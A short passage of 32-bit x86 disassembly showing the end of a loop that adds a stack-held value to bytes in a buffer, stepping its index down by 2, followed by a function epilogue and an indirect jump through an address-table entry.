  416a2d:	mov    eax,DWORD PTR [ebp-0x10]
  416a30:	add    eax,DWORD PTR [ebp-0x4]
  416a33:	movzx  ecx,BYTE PTR [eax]
  416a36:	add    ecx,DWORD PTR [ebp-0xc]
  416a39:	mov    edx,DWORD PTR [ebp-0x10]
  416a3c:	add    edx,DWORD PTR [ebp-0x4]
  416a3f:	mov    BYTE PTR [edx],cl
  416a41:	mov    eax,DWORD PTR [ebp-0x4]
  416a44:	sub    eax,0x2
  416a47:	mov    DWORD PTR [ebp-0x4],eax
  416a4a:	mov    ecx,DWORD PTR [ebp-0x4]
  416a4d:	cmp    ecx,DWORD PTR [ebp+0x10]
  416a50:	jl     0x4169c2
  416a56:	pop    ebx
  416a57:	mov    esp,ebp
  416a59:	pop    ebp
  416a5a:	ret    
  416a5b:	int3   
  416a5c:	jmp    DWORD PTR ds:0x417008
